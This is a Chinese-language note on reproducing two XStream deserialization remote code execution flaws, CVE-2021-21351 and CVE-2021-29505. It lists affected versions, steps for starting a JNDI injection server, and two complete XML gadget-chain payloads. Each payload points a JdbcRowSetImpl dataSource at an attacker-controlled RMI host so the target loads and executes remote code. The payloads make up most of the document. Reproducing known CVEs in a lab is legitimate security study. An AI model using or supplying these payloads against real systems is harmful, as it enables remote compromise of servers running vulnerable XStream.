XStram能将对象序列化成XML，或者把xml反序列化成对象

### 代码执行（CVE-2021-21351）

[XStream 反序列化命令执行漏洞复现（CVE-2021-21351）-CSDN博客](https://blog.csdn.net/weixin_45071708/article/details/130247380)

##### 版本

其 1.4.15 及之前

##### 利用

1.使用JNDI注入工具，启动JNDI服务器

JNDI注入工具：https://github.com/welk1n/JNDI-Injection-exploit/

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a39f1483a0620b600ba69095239bbb4b.png)

如下为基于SpringBoot漏洞利用工具的RMI地址：rmi://192.168.153.1:1099/sxsyfi

2.**构造请求包内容如下，内容中的rmi://evil-ip:1099/example替换成上面生成的RMI地址：rmi://192.168.153.1:1099/sxsyfi**

```
<sorted-set>
 <javax.naming.ldap.Rdn_-RdnEntry>

  <type>ysomap</type>
  <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
   <m__DTMXRTreeFrag>
     <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
      <m__size>-10086</m__size>
      <m__mgrDefault>
       <__overrideDefaultParser>false</__overrideDefaultParser>
       <m__incremental>false</m__incremental>
       <m__source__location>false</m__source__location>
       <m__dtms>
        <null/>
       </m__dtms>
       <m__defaultHandler/>
      </m__mgrDefault>
      <m__shouldStripWS>false</m__shouldStripWS>
      <m__indexing>false</m__indexing>
      <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
       <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
        <javax.sql.rowset.BaseRowSet>
          <default>
          <concurrency>1008</concurrency>
          <escapeProcessing>true</escapeProcessing>
          <fetchDir>1000</fetchDir>
          <fetchSize>0</fetchSize>
          <isolation>2</isolation>
          <maxFieldSize>0</maxFieldSize>
          <maxRows>0</maxRows>
          <queryTimeout>0</queryTimeout>
          <readOnly>true</readOnly>
          <rowSetType>1004</rowSetType>
          <showDeleted>false</showDeleted>
          <dataSource>rmi://evil-ip:1099/example</dataSource>
          <listeners/>
          <params/>
         </default>
        </javax.sql.rowset.BaseRowSet>
        <com.sun.rowset.JdbcRowSetImpl>
         <default/>
        </com.sun.rowset.JdbcRowSetImpl>
       </fPullParserConfig>
       <fConfigSetInput>
        <class>com.sun.rowset.JdbcRowSetImpl</class>
        <name>setAutoCommit</name>
        <parameter-types>
         <class>boolean</class>
        </parameter-types>
       </fConfigSetInput>
       <fConfigParse reference='../fConfigSetInput'/>
       <fParseInProgress>false</fParseInProgress>
      </m__incrementalSAXSource>
      <m__walker>
       <nextIsRaw>false</nextIsRaw>
      </m__walker>
      <m__endDocumentOccured>false</m__endDocumentOccured>
      <m__idAttributes/>
      <m__textPendingStart>-1</m__textPendingStart>
      <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
      <m__pastFirstElement>false</m__pastFirstElement>
     </m__dtm>
     <m__dtmIdentity>1</m__dtmIdentity>
   </m__DTMXRTreeFrag>
   <m__dtmRoot>1</m__dtmRoot>
   <m__allowRelease>false</m__allowRelease>
  </value>
 </javax.naming.ldap.Rdn_-RdnEntry>
 <javax.naming.ldap.Rdn_-RdnEntry>
  <type>ysomap</type>
  <value class='com.sun.org.apache.xpath.internal.objects.XString'>
   <m__obj class='string'>test</m__obj>
  </value>
 </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>

```

3.构造请求包，并将请求包中的GET改为POST，并发送请求

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7ab32922d6e064321d71587f1f950bd4.png)

4.目标home目录下出现我们创建的文件CVE-SUCCESS，漏洞复现成功
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/89bf8fa2e2da3cf0ec552ab8ebbcd7c7.png)

### 远程代码执行（CVE-2021-29505）

##### 版本

Stream<=1.4.16

##### 利用

poc:

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.rowset.JdbcRowSetImpl</class>
                          <name>getDatabaseMetaData</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
                  <javax.sql.rowset.BaseRowSet>
                    <default>
                      <concurrency>1008</concurrency>
                      <escapeProcessing>true</escapeProcessing>
                      <fetchDir>1000</fetchDir>
                      <fetchSize>0</fetchSize>
                      <isolation>2</isolation>
                      <maxFieldSize>0</maxFieldSize>
                      <maxRows>0</maxRows>
                      <queryTimeout>0</queryTimeout>
                      <readOnly>true</readOnly>
                      <rowSetType>1004</rowSetType>
                      <showDeleted>false</showDeleted>
                      <dataSource>rmi://192.168.63.1:1099</dataSource>
                      <params/>
                    </default>
                  </javax.sql.rowset.BaseRowSet>
                  <com.sun.rowset.JdbcRowSetImpl>
                    <default>
                      <iMatchColumns>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                      </iMatchColumns>
                      <strMatchColumns>
                        <string>foo</string>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                      </strMatchColumns>
                    </default>
                  </com.sun.rowset.JdbcRowSetImpl>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>

```

具体文章：[xstream 远程代码执行 CVE-2021-29505 已亲自复现_xstream远程代码执行漏洞-CSDN博客](https://blog.csdn.net/qq_42430287/article/details/135229815)